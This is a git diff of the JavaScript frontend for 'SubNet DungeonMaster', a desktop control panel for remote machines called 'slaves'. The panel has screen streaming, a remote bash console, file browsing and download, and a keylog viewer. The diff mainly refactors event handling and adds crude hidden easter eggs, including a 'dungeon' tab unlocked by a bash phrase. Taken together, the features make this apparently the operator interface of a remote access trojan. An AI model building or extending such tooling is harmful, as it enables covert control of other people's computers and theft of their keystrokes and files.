@@ -1,37 +1,8 @@
 /**
  * SubNet DungeonMaster — frontend
  *
- * Python → JS:
- *   setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo,
- *   setScreen(base64 [, mime]), appendBash, clearBash, setLoginError
- *   setSlaveState(items)
- *   setLocal(entries [, path])
- *   setExplorerPath(path)
- *   setExplorerFile(path, content, isImage?)
- *   setKeyLog(entries)
- *
- * JS → Python:
- *   log_in, window_*, on_slave_*, on_page_change, on_group_toggle,
- *   on_bash_command, on_screen_*, on_slaves_refresh
- *   on_state_action(id, action)
- *   on_open_folder, on_open_file, on_item_remove, on_rename, on_move,
- *   on_save_file, on_create_item, on_file_download
- *   on_slave_display_name_changed(id, displayName)
- *   on_slave_group_changed(id, group|null)
- *   on_group_rename(oldName, newName)
- *   on_group_create(name)
- *   on_group_delete(name)
- *   onReconnect()
- *   onKeyLogTimeRangeSet, onKeyLogSave
- *
- * Hotkeys (when not typing in input):
- *   1–6  switch tab (info/screen/bash/state/explorer/keylog)
- *   S    toggle slaves drawer
- *   R    reconnect
- *   Esc  close drawer / explorer viewer
- *   Ctrl+L  focus bash
- * Bash input:
- *   ↑ / ↓  command history
+ * Hotkeys: 1–5 tabs, 6 dungeon (if unlocked), S drawer, R reconnect, Esc, Ctrl+L bash
+ * Bash: ↑↓ history · "enter the dungeon" unlocks ♂ tab
  */
 
 (function () {
@@ -39,6 +10,10 @@
 
   const $  = (sel, root = document) => root.querySelector(sel);
   const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];
+
+  function on(el, ev, fn, opts) {
+    if (el) el.addEventListener(ev, fn, opts);
+  }
 
   function callPython(method, ...args) {
     try {
@@ -70,9 +45,10 @@
     return parts.join('/') || '/';
   }
 
-  const PAGE_ORDER = ['info', 'screen', 'bash', 'state', 'explorer', 'keylog'];
+  const PAGE_ORDER = ['info', 'screen', 'bash', 'explorer', 'keylog'];
   const BASH_HISTORY_KEY = 'dm_bash_history';
   const BASH_HISTORY_MAX = 80;
+  const DEFAULT_YT = 'dQw4w9WgXcQ';
 
   let currentPage = 'info';
   let activeSlaveId = null;
@@ -84,6 +60,8 @@
   let cmEditor = null;
   let keylogEntries = [];
   let keylogSelected = new Set();
+  let dungeonUnlocked = false;
+  let dungeonCurrentId = DEFAULT_YT;
 
   let bashHistory = [];
   try {
@@ -140,6 +118,11 @@
   const keylogTo = $('#keylog-to');
   const btnKeylogApply = $('#btn-keylog-apply');
   const btnKeylogSave = $('#btn-keylog-save');
+  const tabDungeon = $('#tab-dungeon');
+  const dungeonYt = $('#dungeon-yt');
+  const dungeonPlayer = $('#dungeon-player');
+  const dungeonThumb = $('#dungeon-thumb');
+  const dungeonTitle = $('#dungeon-title');
 
   function isTypingTarget(el) {
     if (!el) return false;
@@ -158,10 +141,164 @@
     try { localStorage.setItem(BASH_HISTORY_KEY, JSON.stringify(bashHistory)); } catch (_) {}
   }
 
-  btnLogin.addEventListener('click', onLogin);
-  passwordInp.addEventListener('keydown', (e) => { if (e.key === 'Enter') onLogin(); });
+  function sendAnnounce(message, type) {
+    type = type || 'info';
+    if (!announceContainer) return;
+    const el = document.createElement('div');
+    el.className = 'announce ' + type;
+    el.innerHTML = '<span class="announce-msg">' + escapeHtml(message) + '</span><button class="announce-close" type="button">×</button>';
+    const dismiss = () => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); };
+    on(el.querySelector('.announce-close'), 'click', dismiss);
+    announceContainer.appendChild(el);
+    setTimeout(dismiss, type === 'error' ? 8000 : 5000);
+  }
+
+  function setLoginError(msg) {
+    if (!loginError) return;
+    if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
+    loginError.textContent = msg; loginError.hidden = false;
+  }
+
+  function setMaximized(state) {
+    if (iconMaximize) iconMaximize.hidden = !!state;
+    if (iconRestore) iconRestore.hidden = !state;
+  }
+
+  function updateNoSlaveHint() {
+    const noSlave = !activeSlaveId;
+    if (infoNoSlave) infoNoSlave.classList.toggle('visible', noSlave);
+    if (infoGrid) infoGrid.style.display = noSlave ? 'none' : '';
+    if (bashInput) {
+      bashInput.disabled = noSlave;
+      bashInput.placeholder = noSlave ? 'select a slave first, master…' : 'command…';
+    }
+  }
+
+  function updateActiveSlaveBar(slave) {
+    if (!activeSlaveBar) return;
+    if (!slave) { activeSlaveBar.hidden = true; return; }
+    activeSlaveBar.hidden = false;
+    if (activeSlaveName) activeSlaveName.textContent = slave.displayName || slave.id;
+    if (activeSlaveDot) activeSlaveDot.classList.toggle('online', !!slave.online);
+  }
+
+  function switchPage(name) {
+    if (!name || name === currentPage) return;
+    if (name === 'dungeon') {
+      if (!dungeonUnlocked) return;
+    } else if (PAGE_ORDER.indexOf(name) < 0) {
+      return;
+    }
+    currentPage = name;
+    $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
+    $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
+    callPython('on_page_change', name);
+    if (name === 'bash' && bashInput) setTimeout(() => bashInput.focus(), 50);
+    if (name === 'explorer' && cmEditor) setTimeout(() => cmEditor.refresh(), 50);
+  }
+
+  function openDrawer() {
+    if (drawer) drawer.classList.add('open');
+    if (drawerOverlay) drawerOverlay.classList.add('open');
+  }
+  function closeDrawer() {
+    if (drawer) drawer.classList.remove('open');
+    if (drawerOverlay) drawerOverlay.classList.remove('open');
+  }
+  function toggleDrawer() {
+    if (drawer && drawer.classList.contains('open')) closeDrawer();
+    else openDrawer();
+  }
+
+  function doReconnect() {
+    const btn = $('#btn-reconnect');
+    if (btn) {
+      btn.classList.add('spinning');
+      setTimeout(() => btn.classList.remove('spinning'), 900);
+    }
+    callPython('on_reconnect');
+  }
+
+  // ─── dungeon (YT 153-safe) ─────────────────────────────────
+  function ytWatchUrl(id) { return 'https://www.youtube.com/watch?v=' + id; }
+  function ytThumbUrl(id) { return 'https://i.ytimg.com/vi/' + id + '/hqdefault.jpg'; }
+  function ytEmbedUrl(id) {
+    const origin = (location.origin && location.origin !== 'null') ? location.origin : 'https://localhost';
+    return 'https://www.youtube-nocookie.com/embed/' + id
+      + '?rel=0&modestbranding=1&playsinline=1'
+      + '&origin=' + encodeURIComponent(origin);
+  }
+
+  function openExternalVideo(id) {
+    const url = ytWatchUrl(id || dungeonCurrentId);
+    try {
+      if (window.pywebview && window.pywebview.api) {
+        if (typeof window.pywebview.api.open_url === 'function') {
+          window.pywebview.api.open_url(url); return;
+        }
+        if (typeof window.pywebview.api.on_open_url === 'function') {
+          window.pywebview.api.on_open_url(url); return;
+        }
+      }
+    } catch (_) {}
+    try { window.open(url, '_blank'); }
+    catch (_) { sendAnnounce('Open: ' + url, 'info'); }
+  }
+
+  function stopDungeonVideo() {
+    if (dungeonYt) { dungeonYt.src = ''; dungeonYt.hidden = true; }
+    if (dungeonPlayer) dungeonPlayer.classList.remove('embed-active');
+  }
+
+  function playDungeonVideo(id) {
+    dungeonCurrentId = id || DEFAULT_YT;
+    stopDungeonVideo();
+    if (dungeonThumb) dungeonThumb.src = ytThumbUrl(dungeonCurrentId);
+    if (dungeonTitle) dungeonTitle.textContent = 'Track · ' + dungeonCurrentId;
+  }
+
+  function tryDungeonEmbed() {
+    if (!dungeonYt) return;
+    dungeonYt.hidden = false;
+    dungeonYt.src = ytEmbedUrl(dungeonCurrentId || DEFAULT_YT);
+    if (dungeonPlayer) dungeonPlayer.classList.add('embed-active');
+    sendAnnounce('If embed shows error 153 — use EXTERNAL', 'warn');
+  }
+
+  function unlockDungeonTab(andOpen) {
+    dungeonUnlocked = true;
+    if (tabDungeon) tabDungeon.hidden = false;
+    sendAnnounce('The door is open, master', 'success');
+    if (andOpen) {
+      switchPage('dungeon');
+      playDungeonVideo(DEFAULT_YT);
+    }
+  }
+
+  function sealDungeonTab() {
+    stopDungeonVideo();
+    if (currentPage === 'dungeon') switchPage('info');
+    dungeonUnlocked = false;
+    if (tabDungeon) tabDungeon.hidden = true;
+  }
+
+  function setAuthenticated(state) {
+    if (state) {
+      if (splash) splash.hidden = true;
+      if (app) app.hidden = false;
+      updateNoSlaveHint();
+    } else {
+      if (app) app.hidden = true;
+      if (splash) splash.hidden = false;
+      if (passwordInp) passwordInp.value = '';
+      setLoginError(null);
+      closeSlave(false);
+      sealDungeonTab();
+    }
+  }
 
   function onLogin() {
+    if (!passwordInp) return;
     const v = (passwordInp.value || '').trim().toLowerCase().replace(/\s+/g, '');
     const secrets = {
       '300': 'Fisting is 300 bucks — noted, master',
@@ -174,36 +311,10 @@
     callPython('log_in', passwordInp.value);
   }
 
-  function setLoginError(msg) {
-    if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
-    loginError.textContent = msg; loginError.hidden = false;
-  }
-
-  function setAuthenticated(state) {
-    if (state) { splash.hidden = true; app.hidden = false; updateNoSlaveHint(); }
-    else {
-      app.hidden = true; splash.hidden = false; passwordInp.value = '';
-      setLoginError(null); closeSlave(false);
-    }
-  }
-
-  $('#btn-minimize').addEventListener('click', () => callPython('window_minimize'));
-  $('#btn-maximize').addEventListener('click', () => callPython('window_maximize'));
-  $('#btn-close').addEventListener('click', () => callPython('window_close'));
-  const btnSplashMin = $('#btn-splash-minimize');
-  const btnSplashClose = $('#btn-splash-close');
-  if (btnSplashMin) btnSplashMin.addEventListener('click', () => callPython('window_minimize'));
-  if (btnSplashClose) btnSplashClose.addEventListener('click', () => callPython('window_close'));
-
-  function setMaximized(state) {
-    iconMaximize.hidden = !!state;
-    iconRestore.hidden = !state;
-  }
-
   function bindDrag(el) {
     if (!el) return;
     let startX, startY;
-    el.addEventListener('mousedown', (e) => {
+    on(el, 'mousedown', (e) => {
       if (e.button !== 0) return;
       if (e.target.closest('button, input, select, a, .no-drag')) return;
       startX = e.screenX; startY = e.screenY;
@@ -220,73 +331,39 @@
       document.addEventListener('mouseup', onUp);
     });
   }
+
+  // window controls
+  on($('#btn-minimize'), 'click', () => callPython('window_minimize'));
+  on($('#btn-maximize'), 'click', () => callPython('window_maximize'));
+  on($('#btn-close'), 'click', () => callPython('window_close'));
+  on($('#btn-splash-minimize'), 'click', () => callPython('window_minimize'));
+  on($('#btn-splash-close'), 'click', () => callPython('window_close'));
+  on(btnLogin, 'click', onLogin);
+  on(passwordInp, 'keydown', (e) => { if (e.key === 'Enter') onLogin(); });
   bindDrag($('#titlebar-drag'));
   bindDrag($('#splash-drag'));
 
-  function sendAnnounce(message, type) {
-    type = type || 'info';
-    const el = document.createElement('div');
-    el.className = 'announce ' + type;
-    el.innerHTML = '<span class="announce-msg">' + escapeHtml(message) + '</span><button class="announce-close" type="button">×</button>';
-    const dismiss = () => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); };
-    el.querySelector('.announce-close').addEventListener('click', dismiss);
-    announceContainer.appendChild(el);
-    setTimeout(dismiss, type === 'error' ? 8000 : 5000);
-  }
-
-  tabs.addEventListener('click', (e) => {
+  on(tabs, 'click', (e) => {
     const btn = e.target.closest('.tab');
     if (!btn) return;
     switchPage(btn.dataset.page);
   });
 
-  function switchPage(name) {
-    if (!name || name === currentPage) return;
-    if (PAGE_ORDER.indexOf(name) < 0) return;
-    currentPage = name;
-    $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
-    $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
-    callPython('on_page_change', name);
-    if (name === 'bash') setTimeout(() => bashInput.focus(), 50);
-    if (name === 'explorer' && cmEditor) setTimeout(() => cmEditor.refresh(), 50);
-  }
-
-  function openDrawer() { drawer.classList.add('open'); drawerOverlay.classList.add('open'); }
-  function closeDrawer() { drawer.classList.remove('open'); drawerOverlay.classList.remove('open'); }
-  function toggleDrawer() { drawer.classList.contains('open') ? closeDrawer() : openDrawer(); }
-  btnSlaves.addEventListener('click', toggleDrawer);
-  btnDrawerClose.addEventListener('click', closeDrawer);
-  drawerOverlay.addEventListener('click', closeDrawer);
+  on(btnSlaves, 'click', toggleDrawer);
+  on(btnDrawerClose, 'click', closeDrawer);
+  on(drawerOverlay, 'click', closeDrawer);
 
   const btnSlavesRefresh = $('#btn-slaves-refresh');
-  if (btnSlavesRefresh) {
-    btnSlavesRefresh.addEventListener('click', () => {
+  on(btnSlavesRefresh, 'click', () => {
+    if (btnSlavesRefresh) {
       btnSlavesRefresh.classList.add('spinning');
-      callPython('on_slaves_refresh');
       setTimeout(() => btnSlavesRefresh.classList.remove('spinning'), 800);
-    });
-  }
-
-  const btnReconnect = $('#btn-reconnect');
-  function doReconnect() {
-    if (!btnReconnect) {
-      callPython('onReconnect');
-      return;
     }
-    btnReconnect.classList.add('spinning');
-    callPython('onReconnect');
-    setTimeout(() => btnReconnect.classList.remove('spinning'), 900);
-  }
-  if (btnReconnect) btnReconnect.addEventListener('click', doReconnect);
+    callPython('on_slaves_refresh');
+  });
+  on($('#btn-reconnect'), 'click', doReconnect);
 
-  function setSlavesTree(tree) {
-    slavesTreeData = Array.isArray(tree) ? tree : [];
-    rebuildIndex(slavesTreeData);
-    renderSlavesTree();
-    if (activeSlaveId && !slavesIndex[activeSlaveId]) closeSlave(false);
-    else if (activeSlaveId) updateActiveSlaveBar(slavesIndex[activeSlaveId]);
-  }
-
+  // ─── slaves tree ───────────────────────────────────────────
   function rebuildIndex(nodes, map) {
     map = map || {};
     slavesIndex = map;
@@ -297,7 +374,16 @@
     return map;
   }
 
+  function setSlavesTree(tree) {
+    slavesTreeData = Array.isArray(tree) ? tree : [];
+    rebuildIndex(slavesTreeData);
+    renderSlavesTree();
+    if (activeSlaveId && !slavesIndex[activeSlaveId]) closeSlave(false);
+    else if (activeSlaveId) updateActiveSlaveBar(slavesIndex[activeSlaveId]);
+  }
+
   function renderSlavesTree() {
+    if (!slavesTreeEl) return;
     slavesTreeEl.innerHTML = '';
     if (!slavesTreeData.length) {
       const empty = document.createElement('div');
@@ -306,7 +392,7 @@
       slavesTreeEl.appendChild(empty);
     } else {
       slavesTreeData.forEach(node => {
-        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node, null));
+        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node));
       });
     }
     slavesTreeEl.classList.add('drop-root');
@@ -341,62 +427,50 @@
         '<button type="button" data-act="delete" class="danger" title="Delete group">×</button>' +
       '</span>';
 
-    header.addEventListener('click', (e) => {
+    on(header, 'click', (e) => {
       if (e.target.closest('.group-name-input') || e.target.closest('.group-actions')) return;
       el.classList.toggle('collapsed');
       callPython('on_group_toggle', group.name, el.classList.contains('collapsed'));
     });
 
     const nameSpan = header.querySelector('.group-name');
-    nameSpan.addEventListener('dblclick', (e) => {
-      e.stopPropagation();
-      startGroupRename(group, nameSpan);
+    on(nameSpan, 'dblclick', (e) => { e.stopPropagation(); startGroupRename(group, nameSpan); });
+    on(header.querySelector('[data-act="rename"]'), 'click', (e) => {
+      e.stopPropagation(); startGroupRename(group, nameSpan);
     });
-    header.querySelector('[data-act="rename"]').addEventListener('click', (e) => {
-      e.stopPropagation();
-      startGroupRename(group, nameSpan);
-    });
-    header.querySelector('[data-act="delete"]').addEventListener('click', (e) => {
+    on(header.querySelector('[data-act="delete"]'), 'click', (e) => {
       e.stopPropagation();
       if (!confirm('Delete group "' + group.name + '"? Slaves will be ungrouped.')) return;
       callPython('on_group_delete', group.name);
     });
 
-    header.addEventListener('dragover', (e) => {
-      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
-      e.preventDefault();
-      e.stopPropagation();
-      header.classList.add('drop-target');
-    });
-    header.addEventListener('dragleave', () => header.classList.remove('drop-target'));
-    header.addEventListener('drop', (e) => {
+    const drop = (e) => {
       header.classList.remove('drop-target');
       const id = e.dataTransfer.getData('application/x-slave-id');
       if (!id) return;
       e.preventDefault();
       e.stopPropagation();
       callPython('on_slave_group_changed', id, group.name);
+    };
+    on(header, 'dragover', (e) => {
+      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
+      e.preventDefault(); e.stopPropagation();
+      header.classList.add('drop-target');
     });
+    on(header, 'dragleave', () => header.classList.remove('drop-target'));
+    on(header, 'drop', drop);
 
     const body = document.createElement('div');
     body.className = 'tree-group-body';
-    body.addEventListener('dragover', (e) => {
+    on(body, 'dragover', (e) => {
       if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
-      e.preventDefault();
-      e.stopPropagation();
+      e.preventDefault(); e.stopPropagation();
       header.classList.add('drop-target');
     });
-    body.addEventListener('drop', (e) => {
-      header.classList.remove('drop-target');
-      const id = e.dataTransfer.getData('application/x-slave-id');
-      if (!id) return;
-      e.preventDefault();
-      e.stopPropagation();
-      callPython('on_slave_group_changed', id, group.name);
-    });
+    on(body, 'drop', drop);
 
     (group.children || []).forEach(child => {
-      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child, group.name));
+      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child));
     });
     el.appendChild(header);
     el.appendChild(body);
@@ -422,14 +496,14 @@
       }
       renderSlavesTree();
     };
-    input.addEventListener('keydown', (e) => {
+    on(input, 'keydown', (e) => {
       if (e.key === 'Enter') { e.preventDefault(); commit(); }
       if (e.key === 'Escape') { done = true; renderSlavesTree(); }
     });
-    input.addEventListener('blur', commit);
+    on(input, 'blur', commit);
   }
 
-  function renderSlave(slave, groupName) {
+  function renderSlave(slave) {
     const el = document.createElement('div');
     el.className = 'slave-item' + (slave.id === activeSlaveId ? ' selected' : '');
     el.dataset.id = slave.id;
@@ -449,11 +523,11 @@
         '</div>' +
       '</div>';
 
-    el.addEventListener('click', (e) => {
+    on(el, 'click', (e) => {
       if (e.target.closest('.btn-rename-slave') || e.target.closest('.slave-name-input')) return;
       openSlave(slave.id);
     });
-    el.addEventListener('contextmenu', (e) => {
+    on(el, 'contextmenu', (e) => {
       e.preventDefault();
       callPython('on_slave_context', slave.id, e.clientX, e.clientY);
     });
@@ -466,7 +540,7 @@
       input.className = 'slave-name-input';
       input.value = slave.displayName || slave.id;
       nameEl.replaceWith(input);
-      const btn = row.querySelector('.btn-rename-slave');
+      const btn = row && row.querySelector('.btn-rename-slave');
       if (btn) btn.hidden = true;
       input.focus();
       input.select();
@@ -482,33 +556,28 @@
         }
         renderSlavesTree();
       };
-      input.addEventListener('keydown', (ev) => {
+      on(input, 'keydown', (ev) => {
         if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
         if (ev.key === 'Escape') { done = true; renderSlavesTree(); }
       });
-      input.addEventListener('blur', commit);
+      on(input, 'blur', commit);
     };
-    nameEl.addEventListener('dblclick', startRename);
-    el.querySelector('.btn-rename-slave').addEventListener('click', startRename);
-
-    el.addEventListener('dragstart', (e) => {
+    on(nameEl, 'dblclick', startRename);
+    on(el.querySelector('.btn-rename-slave'), 'click', startRename);
+    on(el, 'dragstart', (e) => {
       e.dataTransfer.setData('application/x-slave-id', slave.id);
       e.dataTransfer.effectAllowed = 'move';
       el.classList.add('dragging');
     });
-    el.addEventListener('dragend', () => el.classList.remove('dragging'));
-
+    on(el, 'dragend', () => el.classList.remove('dragging'));
     return el;
   }
 
-  const btnAddGroup = $('#btn-slaves-add-group');
-  if (btnAddGroup) {
-    btnAddGroup.addEventListener('click', () => {
-      const name = prompt('Group name');
-      if (!name || !name.trim()) return;
-      callPython('on_group_create', name.trim());
-    });
-  }
+  on($('#btn-slaves-add-group'), 'click', () => {
+    const name = prompt('Group name');
+    if (!name || !name.trim()) return;
+    callPython('on_group_create', name.trim());
+  });
 
   function openSlave(id) {
     const slave = slavesIndex[id];
@@ -530,30 +599,16 @@
     const prev = activeSlaveId;
     activeSlaveId = null;
     $$('.slave-item').forEach(s => s.classList.remove('selected'));
-    activeSlaveBar.hidden = true;
+    if (activeSlaveBar) activeSlaveBar.hidden = true;
     updateNoSlaveHint();
     setInfo({}); setScreen(null); clearBash();
     if (notify && prev) callPython('on_slave_close', prev);
   }
 
-  function updateActiveSlaveBar(slave) {
-    if (!slave) { activeSlaveBar.hidden = true; return; }
-    activeSlaveBar.hidden = false;
-    activeSlaveName.textContent = slave.displayName || slave.id;
-    activeSlaveDot.classList.toggle('online', !!slave.online);
-  }
-
-  function updateNoSlaveHint() {
-    const noSlave = !activeSlaveId;
-    if (infoNoSlave) infoNoSlave.classList.toggle('visible', noSlave);
-    infoGrid.style.display = noSlave ? 'none' : '';
-    bashInput.disabled = noSlave;
-    bashInput.placeholder = noSlave ? 'select a slave first, master…' : 'command…';
-  }
-
-  btnCloseSlave.addEventListener('click', () => closeSlave(true));
+  on(btnCloseSlave, 'click', () => closeSlave(true));
 
   function setInfo(data) {
+    if (!infoGrid) return;
     infoGrid.innerHTML = '';
     let entries = [];
     if (Array.isArray(data)) entries = data.map(item => [item.key, item.value]);
@@ -566,7 +621,7 @@
         empty.textContent = 'No data';
         infoGrid.appendChild(empty);
       }
-      infoMeta.textContent = '—';
+      if (infoMeta) infoMeta.textContent = '—';
       return;
     }
     entries.forEach(([key, value]) => {
@@ -575,41 +630,47 @@
       card.innerHTML = '<span class="key">' + escapeHtml(key) + '</span><span class="value">' + escapeHtml(value) + '</span>';
       infoGrid.appendChild(card);
     });
-    infoMeta.textContent = entries.length + ' item' + (entries.length === 1 ? '' : 's');
+    if (infoMeta) infoMeta.textContent = entries.length + ' item' + (entries.length === 1 ? '' : 's');
   }
 
   function setScreen(base64, mime) {
+    if (!screenImg) return;
     if (!base64) {
-      screenImg.hidden = true; screenImg.removeAttribute('src'); screenPlaceholder.hidden = false; return;
+      screenImg.hidden = true; screenImg.removeAttribute('src');
+      if (screenPlaceholder) screenPlaceholder.hidden = false;
+      return;
     }
     let src = base64;
     if (typeof base64 === 'string' && !base64.startsWith('data:')) {
       src = 'data:' + (mime || 'image/jpeg') + ';base64,' + base64.replace(/\s+/g, '');
     }
-    screenImg.src = src; screenImg.hidden = false; screenPlaceholder.hidden = true;
+    screenImg.src = src; screenImg.hidden = false;
+    if (screenPlaceholder) screenPlaceholder.hidden = true;
   }
 
-  ['dragenter', 'dragover'].forEach(ev => {
-    dropzone.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag-over'); });
-  });
-  ['dragleave', 'drop'].forEach(ev => {
-    dropzone.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag-over'); });
-  });
-  dropzone.addEventListener('drop', (e) => {
-    const files = e.dataTransfer.files;
-    if (!files || !files.length) return;
-    const file = files[0];
-    if (!file.type.startsWith('image/')) { callPython('on_screen_drop', null, 'not_image'); return; }
-    const reader = new FileReader();
-    reader.onload = () => { setScreen(reader.result); callPython('on_screen_drop', reader.result, file.name); };
-    reader.readAsDataURL(file);
-  });
-
-  $('#btn-screen-expand').addEventListener('click', () => callPython('on_screen_expand'));
-  $('#screen-fps').addEventListener('change', (e) => callPython('on_screen_fps', Number(e.target.value)));
-  $('#screen-quality').addEventListener('change', (e) => callPython('on_screen_quality', e.target.value));
+  if (dropzone) {
+    ['dragenter', 'dragover'].forEach(ev => {
+      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag-over'); });
+    });
+    ['dragleave', 'drop'].forEach(ev => {
+      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag-over'); });
+    });
+    on(dropzone, 'drop', (e) => {
+      const files = e.dataTransfer.files;
+      if (!files || !files.length) return;
+      const file = files[0];
+      if (!file.type.startsWith('image/')) { callPython('on_screen_drop', null, 'not_image'); return; }
+      const reader = new FileReader();
+      reader.onload = () => { setScreen(reader.result); callPython('on_screen_drop', reader.result, file.name); };
+      reader.readAsDataURL(file);
+    });
+  }
+  on($('#btn-screen-expand'), 'click', () => callPython('on_screen_expand'));
+  on($('#screen-fps'), 'change', (e) => callPython('on_screen_fps', Number(e.target.value)));
+  on($('#screen-quality'), 'change', (e) => callPython('on_screen_quality', e.target.value));
 
   function appendBash(text, type) {
+    if (!bashOutput) return;
     type = type || 'out';
     const line = document.createElement('div');
     line.className = 'bash-line ' + type;
@@ -617,10 +678,11 @@
     bashOutput.appendChild(line);
     bashOutput.scrollTop = bashOutput.scrollHeight;
   }
-  function clearBash() { bashOutput.innerHTML = ''; }
+  function clearBash() { if (bashOutput) bashOutput.innerHTML = ''; }
 
   function submitBash() {
     if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
+    if (!bashInput) return;
     const cmd = bashInput.value.trim();
     if (!cmd) return;
     appendBash(cmd, 'cmd');
@@ -631,12 +693,8 @@
     callPython('on_bash_command', cmd);
   }
 
-  bashInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      submitBash();
-      return;
-    }
+  on(bashInput, 'keydown', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); submitBash(); return; }
     if (e.key === 'ArrowUp') {
       e.preventDefault();
       if (!bashHistory.length) return;
@@ -649,20 +707,62 @@
       e.preventDefault();
       if (bashHistoryIdx < 0) return;
       bashHistoryIdx--;
-      if (bashHistoryIdx < 0) {
-        bashInput.value = bashDraft;
-      } else {
-        bashInput.value = bashHistory[bashHistoryIdx] || '';
-      }
+      bashInput.value = bashHistoryIdx < 0 ? bashDraft : (bashHistory[bashHistoryIdx] || '');
     }
   });
 
-  // SLAVE STATE
+  // bash secrets (capture) — work without selected slave
+  const GACHI_QUOTES = [
+    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
+    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
+  ];
+  const BASH_SECRETS = {
+    'boss of this gym': 'You are now boss of this gym',
+    'ass we can': 'YES WE CAN',
+    'thank you sir': 'You are welcome, master',
+    '300 bucks': 'Invoice sent to the dungeon',
+    'gachi': null,
+    'lotion': 'Application requires elevated privileges',
+    'enter the dungeon': '__UNLOCK_DUNGEON__',
+    'leave the dungeon': '__SEAL_DUNGEON__',
+  };
+  on(bashInput, 'keydown', (e) => {
+    if (e.key !== 'Enter') return;
+    const raw = (bashInput.value || '').trim();
+    const cmd = raw.toLowerCase();
+    if (!(cmd in BASH_SECRETS)) return;
+    e.stopImmediatePropagation();
+    e.preventDefault();
+    const code = BASH_SECRETS[cmd];
+    appendBash(raw, 'cmd');
+    pushBashHistory(raw);
+    bashHistoryIdx = -1;
+    bashInput.value = '';
+    if (code === '__UNLOCK_DUNGEON__') {
+      appendBash('Access granted · ♂', 'sys');
+      unlockDungeonTab(true);
+      return;
+    }
+    if (code === '__SEAL_DUNGEON__') {
+      appendBash('Door sealed', 'sys');
+      sealDungeonTab();
+      sendAnnounce('Dungeon sealed', 'info');
+      return;
+    }
+    const msg = code === null
+      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
+      : code;
+    appendBash(msg, 'sys');
+    sendAnnounce(msg, 'success');
+  }, true);
+
+  // STATE (panel inside INFO)
   function setSlaveState(items) {
+    if (!stateList) return;
     stateList.innerHTML = '';
     const list = Array.isArray(items) ? items : [];
-    stateEmpty.classList.toggle('visible', !list.length);
-    stateMeta.textContent = list.length ? String(list.length) : '—';
+    if (stateEmpty) stateEmpty.classList.toggle('visible', !list.length);
+    if (stateMeta) stateMeta.textContent = list.length ? String(list.length) : '—';
     list.forEach((item) => {
       const el = document.createElement('div');
       el.className = 'state-item';
@@ -672,9 +772,15 @@
         const label = typeof a === 'string' ? a : (a.label || a.id);
         return '<button class="tool-btn" data-action="' + escapeHtml(id) + '">' + escapeHtml(label) + '</button>';
       }).join('');
-      el.innerHTML = '<div class="state-item-body"><div class="state-item-name">' + escapeHtml(item.name || item.id || '—') + '</div><div class="state-item-desc">' + escapeHtml(item.description || '') + '</div></div><span class="state-item-status ' + escapeHtml(statusClass) + '">' + escapeHtml(item.status || '—') + '</span><div class="state-item-actions">' + actions + '</div>';
+      el.innerHTML =
+        '<div class="state-item-body">' +
+          '<div class="state-item-name">' + escapeHtml(item.name || item.id || '—') + '</div>' +
+          '<div class="state-item-desc">' + escapeHtml(item.description || '') + '</div>' +
+        '</div>' +
+        '<span class="state-item-status ' + escapeHtml(statusClass) + '">' + escapeHtml(item.status || '—') + '</span>' +
+        '<div class="state-item-actions">' + actions + '</div>';
       el.querySelectorAll('[data-action]').forEach((btn) => {
-        btn.addEventListener('click', () => callPython('on_state_action', item.id || item.name, btn.dataset.action));
+        on(btn, 'click', () => callPython('on_state_action', item.id || item.name, btn.dataset.action));
       });
       stateList.appendChild(el);
     });
@@ -696,7 +802,7 @@
 
   function setExplorerPath(path) {
     explorerPath = path == null || path === '' ? '/' : String(path);
-    explorerPathEl.textContent = explorerPath;
+    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
   }
 
   function setLocal(entries, path) {
@@ -706,11 +812,12 @@
       if (!!a.folder !== !!b.folder) return a.folder ? -1 : 1;
       return String(a.name).localeCompare(String(b.name));
     });
-    explorerPathEl.textContent = explorerPath;
+    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
     renderExplorerTree();
   }
 
   function renderExplorerTree() {
+    if (!explorerTree) return;
     explorerTree.innerHTML = '';
     if (!explorerEntries.length) {
       const empty = document.createElement('div');
@@ -731,123 +838,127 @@
           '<button type="button" data-act="remove" title="Remove">×</button>' +
         '</span>';
 
-      el.addEventListener('click', (e) => {
+      on(el, 'click', (e) => {
         if (e.target.closest('[data-act]')) return;
         if (entry.folder) callPython('on_open_folder', full);
         else callPython('on_open_file', full);
       });
-
       const dl = el.querySelector('[data-act="download"]');
-      if (dl) dl.addEventListener('click', (e) => {
-        e.stopPropagation();
-        callPython('on_file_download', full);
-      });
-      el.querySelector('[data-act="remove"]').addEventListener('click', (e) => {
+      on(dl, 'click', (e) => { e.stopPropagation(); callPython('on_file_download', full); });
+      on(el.querySelector('[data-act="remove"]'), 'click', (e) => {
